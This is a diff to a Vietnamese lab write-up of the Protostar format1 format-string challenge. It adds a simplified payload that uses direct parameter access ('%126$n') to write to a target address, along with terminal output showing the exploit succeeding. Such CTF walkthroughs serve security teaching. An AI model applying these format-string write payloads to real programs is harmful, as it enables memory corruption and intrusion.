@@ -151,7 +151,26 @@ Mục tiêu đã hoàn thành!
 
 Các bạn có thể tham khảo các đáp án khác trong phần cuối bài. Lưu ý, chạy chương trình trong gdb sẽ cần đáp án khác với chạy trực tiếp, do khoảng cách giữa `esp` và địa chỉ của formatted string khác nhau.
 
+## Đơn giản hóa
+
+Có thể sử dụng cú pháp sau với formatted string: `%126$n` để chọn chính xác tham số thứ 126 và lưu giá trị vào đó. Có kèm 2 byte padding
+
+```bash
+python -c 'print "\x38\x96\x04\x08aa%126$n"'
+```
+
+Lưu ý, đoạn code sau có thể gần giống nhưng lại không hoạt động. Nguyên nhân là do single quote và double quote
+
+```bash
+python -c "print '\x38\x96\x04\x08aa%126$n'"
+```
+
 ## Ref
+```bash
+user@protostar:~$ format1 $(python -c 'print "\x38\x96\x04\x08aa%126$n"')
+8aayou have modified the target :)
+```
+
 ```bash
 user@protostar:~$ format1 $(python -c "print '\x38\x96\x04\x08' + '%x.' * 126 + '%n' + 'aa'")
 8804960c.bffff648.8048469.b7fd8304.b7fd7ff4.bffff648.8048435.bffff80c.b7ff1040.804845b.b7fd7ff4.8048450.0.bffff6c8.b7eadc76.2.bffff6f4.bffff700.b7fe1848.bffff6b0.ffffffff.b7ffeff4.804824d.1.bffff6b0.b7ff0626.b7fffab0.b7fe1b28.b7fd7ff4.0.0.bffff6c8.b23ebfe2.986a69f2.0.0.0.2.8048340.0.b7ff6210.b7eadb9b.b7ffeff4.2.8048340.0.8048361.804841c.2.bffff6f4.8048450.8048440.b7ff1040.bffff6ec.b7fff8f8.2.bffff804.bffff80c.0.bffff98f.bffff99d.bffff9a8.bffff9c8.bffff9db.bffff9e5.bffffed5.bfffff22.bfffff36.bfffff45.bfffff56.bfffff5e.bfffff6e.bfffff7b.bfffffad.bfffffc4.0.20.b7fe2414.21.b7fe2000.10.f8bfbff.6.1000.11.64.3.8048034.4.20.5.7.7.b7fe3000.8.0.9.8048340.b.3e9.c.0.d.3e9.e.3e9.17.1.19.bffff7eb.1f.bfffffe1.f.bffff7fb.0.0.0.9a000000.fcbe84e.834ea6e9.a8faeb43.69f834ba.363836.0.6d726f66.317461.aayou have modified the target :)
